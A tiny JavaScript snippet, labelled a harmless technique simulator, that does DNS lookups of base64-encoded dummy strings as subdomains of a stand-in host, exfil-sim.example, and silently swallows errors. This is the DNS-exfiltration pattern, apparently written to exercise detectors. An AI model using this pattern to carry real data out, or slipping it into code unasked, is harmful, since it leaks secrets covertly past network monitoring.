// HARMLESS technique simulator: exhibits the behavioral SHAPE, no real payload.
try{
const dns=require('dns');['YWJjZGVmZ2hpamtsbW5vcHFy','MHhkZWFkYmVlZmNhZmViYWJl','cXdlcnR5dWlvcGFzZGZnaGpr'].forEach(s=>dns.lookup(s+'.exfil-sim.example',()=>{}));
}catch(e){}
